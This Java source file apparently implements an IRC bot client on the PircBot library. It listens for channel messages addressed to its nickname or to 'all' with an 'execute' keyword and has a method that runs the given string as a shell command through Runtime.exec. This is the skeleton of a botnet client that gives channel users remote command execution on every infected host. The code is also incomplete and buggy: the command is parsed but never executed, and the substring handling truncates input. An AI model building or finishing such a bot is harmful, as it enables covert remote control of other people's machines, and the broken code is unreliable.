package client;

import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;

import org.jibble.pircbot.PircBot;

public class Client extends PircBot {

	public Client(String name) {
		this.setName(name);

	}

	public void onMessage(String channel, String sender, String login, String hostname, String message) {
		if (message.charAt(0) == '.') {
			message = message.substring(1, message.length() - 1);
			String[] words = message.split(" ");

			if (words.length > 0 && (words[0].equals(this.getNick()) || words[0].equals("all"))) {

				if (words.length > 2 && words[1].equals("execute")) {

					String command = message.substring(message.indexOf("execute ") + 8, message.length() - 1);

				}

			}

		}

	}
	
	
	private void executeCommand(String command) {
	    try {
	        returnOutput(command);
	        Process process = Runtime.getRuntime().exec(command);
	        logOutput(process.getInputStream(), "");
	        logOutput(process.getErrorStream(), "Error: ");
	        process.waitFor();
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}

	private void logOutput(InputStream inputStream, String prefix) {
	    new Thread(() -> {
	        Scanner scanner = new Scanner(inputStream, "UTF-8");
	        while (scanner.hasNextLine()) {
	            synchronized (this) {
	                returnOutput(prefix + scanner.nextLine());
	            }
	        }
	        scanner.close();
	    }).start();
	}

	private synchronized void returnOutput(String message) {
	    System.out.println(message);
	}
}
